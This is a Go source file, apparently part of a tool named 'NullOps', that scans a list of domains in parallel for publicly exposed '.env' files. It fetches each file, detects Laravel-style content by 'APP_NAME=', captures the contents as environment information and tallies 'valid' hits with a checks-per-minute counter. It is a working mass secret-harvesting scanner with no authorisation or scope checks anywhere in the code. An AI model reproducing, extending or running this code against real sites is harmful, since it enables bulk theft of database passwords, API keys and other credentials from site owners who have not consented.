package Scanners

import (
	"NullOps/CLI_Handlers"
	"NullOps/Helpers"
	"NullOps/Interface"
	"fmt"
	"net/http"
	"regexp"
	"strings"
	"sync/atomic"
	"time"
)

func isHTML(content string) bool {
	htmlRegex := regexp.MustCompile(`<[^>]*>`)
	return htmlRegex.MatchString(content)
}

func captureEnvironmentInfo(responeStr string, url string) (bool, string) {
	config := Helpers.NewAppConfig()
	newlineCount := strings.Count(responeStr, "\n")
	if !isHTML(responeStr) && newlineCount > 1 && len(responeStr) > 6 {
		capture, _ := Helpers.CaptureEnv(responeStr, url, config)
		return true, capture
	}
	return false, ""
}

func scanEnv(config *Helpers.Runner) *Helpers.RunnerResult {
	response, err := Helpers.SendRequest(Helpers.ExtractDomain(config.Line)+".env", "GET", "", Helpers.RequestOptions{LoggingEnabled: true})
	if err != nil {
		return &Helpers.RunnerResult{
			Line:   config.Line,
			Status: false,
			Error:  fmt.Errorf("Failed to send request: %v", err),
		}
	}

	if response.StatusCode != http.StatusOK {
		return &Helpers.RunnerResult{
			Line:   config.Line,
			Status: false,
			Error:  fmt.Errorf("Received non-OK status code: %d", response.StatusCode),
		}
	}

	if err == nil {
		responeStr := Helpers.BytesToString(response.Body)
		re_normal := regexp.MustCompile(`(?i)APP_NAME=`)
		if re_normal.MatchString(responeStr) {
			_, capture := captureEnvironmentInfo(responeStr, Helpers.ExtractDomain(config.Line))
			return &Helpers.RunnerResult{
				Line:   Helpers.ExtractDomain(config.Line) + fmt.Sprintf(" | Capture: [%v]", capture),
				Status: true,
				Error:  nil,
			}
		}
	}

	return &Helpers.RunnerResult{
		Line:   config.Line,
		Status: false,
		Error:  fmt.Errorf("No relevant data found"),
	}
}

func ScannerEnv(config *Helpers.ScanConfig) {
	Helpers.Valid, Helpers.Invalid, Helpers.Checked, Helpers.PayloadsTested, Helpers.CPM, Helpers.HighestCPM, Helpers.Running = 0, 0, 0, 0, 0, 0, true

	FilePath := CLI_Handlers.GetFilePath()
	lines, err := CLI_Handlers.ReadLines(FilePath)
	CLI_Handlers.LogError(err)

	startTime := time.Now()
	go func() {
		for {
			if Helpers.Running {
				elapsedTime := time.Since(startTime)
				Helpers.CPM = int32(int(Helpers.CalculateCPM(int(atomic.LoadInt32(&Helpers.Valid))+int(atomic.LoadInt32(&Helpers.Invalid)), elapsedTime)))
				Helpers.HighestCPM = int32(Helpers.BestCPM(int(Helpers.CPM), int(atomic.LoadInt32(&Helpers.HighestCPM))))

				Interface.StatsTitle(fmt.Sprintf("NullOps | CPM: %v | Highest CPM: %v", int(atomic.LoadInt32(&Helpers.CPM)), int(atomic.LoadInt32(&Helpers.HighestCPM))), int(atomic.LoadInt32(&Helpers.Valid)), int(atomic.LoadInt32(&Helpers.Invalid)), int(atomic.LoadInt32(&Helpers.Checked)), len(lines))
				time.Sleep(1 * time.Second)
			} else {
				return
			}
		}
	}()

	defer func() {
		Helpers.Running = false
		Helpers.ShowResults()
	}()

	Helpers.Threading(func(s string) {
		ScanConfig := Helpers.Runner{Line: s}
		RunnerResult := scanEnv(&ScanConfig)

		atomic.AddInt32(&Helpers.Checked, 1)
		if RunnerResult.Error == nil {
			atomic.AddInt32(&Helpers.Valid, 1)
			Interface.Option(config.Name, RunnerResult.Line)
		} else {
			atomic.AddInt32(&Helpers.Invalid, 1)
			if config.PrintInvalid {
				Interface.Option(config.Name, fmt.Sprintf("%v | Status: %v | Reason: %v", Helpers.ExtractDomain(RunnerResult.Line), RunnerResult.Status, RunnerResult.Error))
			}
		}
	}, config.Threads, lines)
}